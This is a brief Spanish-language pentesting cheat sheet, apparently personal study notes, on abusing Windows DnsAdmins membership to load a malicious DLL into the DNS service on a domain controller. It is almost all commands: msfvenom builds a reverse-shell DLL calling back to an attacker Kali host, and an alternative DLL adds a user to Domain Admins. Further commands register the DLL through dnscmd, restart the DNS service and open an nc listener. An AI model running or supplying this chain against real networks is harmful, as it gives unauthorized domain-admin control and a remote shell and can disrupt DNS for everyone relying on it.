DNS Admins

DNS Admins 1. Crear un Payload 2. Apuntar la configuración del servicio DNS al payload 3. Reiniciar servicio para cargar el paylaod

DnsAdmins puede permitir cargar una DLL en el servicio DNS si se tienen permisos y el servicio corre en un DC. Es una técnica de alto impacto y puede interrumpir resolución DNS.

Kali: Payload

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali_ip> LPORT=443 -f dll -o rev.dll

msfvenom -p windows/x64/exec cmd='net group "domain admins" <user> /add /domain' -f dll -o adduser.dll # Alternativa

CMD: Subimos al DNS el Payload

dnscmd.exe /config /serverlevelplugindll C:\Users\<user>\Desktop\rev.dll

dnscmd /config /serverlevelplugindll C:\Users\<user>\Desktop\adduser.dll # Alternativa

# Comprobar subida
reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll

CMD: Reiniciar el servicio DNS o Esperar que se reinicie solo

# Posible que no tengamos permisos para reiniciar este servicio
sc.exe stop dns
sc.exe start dns

CMD: Comprobar que pertenecemos al grupo de ADMINS o que hemos recibido la reverse shell

net group "Domain Admins" /dom
# Kali: Listener
rlwrap nc -nlvp 443
